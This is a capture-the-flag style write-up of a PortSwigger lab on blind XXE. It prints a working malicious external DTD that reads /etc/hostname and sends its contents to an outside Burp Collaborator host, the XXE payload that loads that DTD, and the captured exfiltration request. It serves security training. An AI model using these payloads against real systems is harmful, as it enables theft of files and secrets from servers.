# Exploiting blind XXE to exfiltrate data using a malicious external DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file.

## 1st thing we do is setup a collaborator client:

4sxkcjiiiqy9dr1k8s1083qbf2lv9k.burpcollaborator.net



<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://4sxkcjiiiqy9dr1k8s1083qbf2lv9k.burpcollaborator.net/exploit.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>


## Second craft the response 

An example of a malicious DTD to exfiltrate the contents of the /etc/hostname file is as follows:

Put this in the response body 
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 
'http://4sxkcjiiiqy9dr1k8s1083qbf2lv9k.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate;

What this does is: 
*Defines an XML parameter entity called file, containing the contents of the /etc/hostname file.
*Defines an XML parameter entity called eval, containing a dynamic declaration of another XML parameter entity called exfiltrate. The exfiltrate entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the file entity within the URL query string.
*Uses the eval entity, which causes the dynamic declaration of the exfiltrate entity to be performed.
*Uses the exfiltrate entity, so that its value is evaluated by requesting the specified URL.

The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver
We are hosting this on Portswigger's provided: https://exploit-acdf1faa1fa0bae2c0e9272f01200015.web-security-academy.net/exploit.dtd

Finally, the attacker must submit the following XXE payload to the vulnerable application
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://exploit-acdf1faa1fa0bae2c0e9272f01200015.web-security-academy.net/exploit.dtd"> %xxe;]>


Following these steps I opened up burp collaborator and was able to get the following and submit successfully:
GET /?x=26859a009870 HTTP/1.1
User-Agent: Java/17.0.1
Host: 4sxkcjiiiqy9dr1k8s1083qbf2lv9k.burpcollaborator.net
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
